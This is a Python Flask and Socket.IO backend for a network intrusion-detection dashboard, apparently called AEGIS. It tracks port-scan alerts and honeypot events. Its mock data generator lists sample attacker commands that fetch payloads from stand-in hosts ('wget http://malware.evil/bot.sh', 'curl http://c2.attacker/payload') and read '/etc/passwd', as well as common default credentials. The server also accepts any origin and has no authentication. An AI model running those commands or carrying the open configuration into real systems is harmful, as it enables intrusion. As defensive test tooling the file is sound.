"""
AEGIS Dashboard — Flask + Socket.IO Backend (v2)
Serves the dashboard UI and handles real-time events.
Includes a mock data generator for testing without the ML pipeline.
"""

import os
import sys
import time
import random
import threading
from datetime import datetime

from flask import Flask, render_template, jsonify, request
from flask_socketio import SocketIO, emit

# ── App Setup ─────────────────────────────────
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ── In-Memory State ───────────────────────────
system_state = {
    'alerts': [],           # List of alert dicts
    'scanners': {},         # { ip: { scan_type, confidence, alert_count, blocked, ... } }
    'honeypot_events': [],  # List of honeypot interaction dicts
    'blocked_ips': set(),
    'start_time': time.time()
}

# ── Routes ────────────────────────────────────
@app.route('/')
def index():
    """Serve the main dashboard page."""
    return render_template('index.html')


@app.route('/api/state')
def get_state():
    """Return current system state as JSON."""
    return jsonify({
        'alerts': system_state['alerts'][-50:],
        'scanners': system_state['scanners'],
        'honeypot_events': system_state['honeypot_events'][-20:],
        'blocked_ips': list(system_state['blocked_ips']),
        'uptime_seconds': int(time.time() - system_state['start_time'])
    })


@app.route('/api/alert', methods=['POST'])
def receive_alert():
    """
    Receive an alert from the ML pipeline or capture engine.
    Expected JSON: { src_ip, scan_type, confidence, dst_port, honeypot_flag }
    """
    data = request.get_json(silent=True)
    if not data or 'src_ip' not in data:
        return jsonify({'error': 'Missing src_ip'}), 400

    alert = {
        'src_ip': data.get('src_ip'),
        'scan_type': data.get('scan_type', 'Unknown'),
        'confidence': float(data.get('confidence', 0.5)),
        'dst_port': data.get('dst_port'),
        'honeypot_flag': bool(data.get('honeypot_flag', False)),
        'timestamp': data.get('timestamp', datetime.utcnow().isoformat())
    }

    # Store and broadcast
    system_state['alerts'].append(alert)
    if len(system_state['alerts']) > 200:
        system_state['alerts'] = system_state['alerts'][-200:]

    _update_scanner(alert)
    socketio.emit('new_alert', alert)

    return jsonify({'status': 'ok'}), 200


@app.route('/api/honeypot', methods=['POST'])
def receive_honeypot():
    """
    Receive a honeypot interaction event.
    Expected JSON: { src_ip, service, command, credentials, timestamp }
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({'error': 'No data'}), 400

    event = {
        'src_ip': data.get('src_ip', 'Unknown'),
        'service': data.get('service', 'SSH'),
        'command': data.get('command', ''),
        'credentials': data.get('credentials', ''),
        'timestamp': data.get('timestamp', datetime.utcnow().isoformat())
    }

    system_state['honeypot_events'].append(event)
    if len(system_state['honeypot_events']) > 100:
        system_state['honeypot_events'] = system_state['honeypot_events'][-100:]

    socketio.emit('honeypot_event', event)
    return jsonify({'status': 'ok'}), 200


# ── Socket.IO Events ─────────────────────────
@socketio.on('connect')
def handle_connect():
    """Send current state to newly connected client."""
    emit('state_update', {
        'scanners': system_state['scanners'],
        'alerts': system_state['alerts'][-50:]
    })


@socketio.on('block_ip')
def handle_block(data):
    """Block an IP address (add to blocked set)."""
    ip = data.get('ip')
    if ip:
        system_state['blocked_ips'].add(ip)
        if ip in system_state['scanners']:
            system_state['scanners'][ip]['blocked'] = True
        socketio.emit('state_update', {'scanners': system_state['scanners']})


# ── Internal Helpers ──────────────────────────
def _update_scanner(alert):
    """Update scanner tracking from an alert."""
    ip = alert['src_ip']
    if ip not in system_state['scanners']:
        system_state['scanners'][ip] = {
            'scan_type': alert['scan_type'],
            'confidence': alert['confidence'],
            'alert_count': 0,
            'honeypot': False,
            'blocked': ip in system_state['blocked_ips'],
            'first_seen': alert['timestamp'],
            'last_seen': alert['timestamp'],
            'ports_probed': [],
            'events': []
        }

    s = system_state['scanners'][ip]
    s['alert_count'] = s.get('alert_count', 0) + 1
    s['confidence'] = max(s.get('confidence', 0), alert['confidence'])
    s['last_seen'] = alert['timestamp']
    if alert.get('honeypot_flag'):
        s['honeypot'] = True
    if alert.get('dst_port') and alert['dst_port'] not in s.get('ports_probed', []):
        s['ports_probed'].append(alert['dst_port'])
    s.setdefault('events', []).append({
        'time': alert['timestamp'],
        'type': 'alert',
        'detail': f"{alert['scan_type']} ({int(alert['confidence']*100)}%)"
    })


# ══════════════════════════════════════════════
# MOCK DATA GENERATOR — for testing only
# Start with: python app.py --mock
# ══════════════════════════════════════════════

MOCK_IPS = [
    '192.168.1.105', '10.0.0.42', '172.16.0.88',
    '192.168.1.201', '10.0.0.77', '172.16.0.33'
]
MOCK_SCAN_TYPES = ['SYN Scan', 'NULL Scan', 'FIN Scan', 'XMAS Scan', 'ACK Scan', 'UDP Scan']
MOCK_SERVICES = ['SSH', 'HTTP', 'FTP', 'Telnet', 'SMB']
MOCK_COMMANDS = [
    'cat /etc/passwd', 'uname -a', 'whoami', 'ls -la',
    'wget http://malware.evil/bot.sh', 'curl http://c2.attacker/payload',
    'id', 'ifconfig', 'netstat -an'
]
MOCK_CREDENTIALS = [
    'root:admin', 'admin:admin', 'root:toor', 'pi:raspberry',
    'admin:password', 'test:test', 'user:123456'
]


def mock_data_loop():
    """Generate mock alerts and honeypot events every 2-5 seconds."""
    print("[MOCK] Starting mock data generator...")
    time.sleep(2)  # Wait for server to start

    while True:
        ip = random.choice(MOCK_IPS)
        scan_type = random.choice(MOCK_SCAN_TYPES)
        confidence = round(random.uniform(0.3, 0.99), 2)
        dst_port = random.choice([22, 80, 443, 8080, 3306, 21, 25, 53, 445, 3389,
                                  random.randint(1000, 65535)])

        alert = {
            'src_ip': ip,
            'scan_type': scan_type,
            'confidence': confidence,
            'dst_port': dst_port,
            'honeypot_flag': random.random() > 0.7,
            'timestamp': datetime.utcnow().isoformat()
        }

        system_state['alerts'].append(alert)
        if len(system_state['alerts']) > 200:
            system_state['alerts'] = system_state['alerts'][-200:]
        _update_scanner(alert)
        socketio.emit('new_alert', alert)

        # Occasionally send honeypot events
        if random.random() > 0.6:
            hp_event = {
                'src_ip': ip,
                'service': random.choice(MOCK_SERVICES),
                'command': random.choice(MOCK_COMMANDS),
                'credentials': random.choice(MOCK_CREDENTIALS),
                'timestamp': datetime.utcnow().isoformat()
            }
            system_state['honeypot_events'].append(hp_event)
            socketio.emit('honeypot_event', hp_event)

        time.sleep(random.uniform(1.5, 4.0))


# ── Main ──────────────────────────────────────
if __name__ == '__main__':
    use_mock = '--mock' in sys.argv

    if use_mock:
        mock_thread = threading.Thread(target=mock_data_loop, daemon=True)
        mock_thread.start()
        print("[AEGIS] Dashboard running with MOCK DATA on http://localhost:5000")
    else:
        print("[AEGIS] Dashboard running on http://localhost:5000")
        print("[AEGIS] Use --mock flag for test data: python app.py --mock")

    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
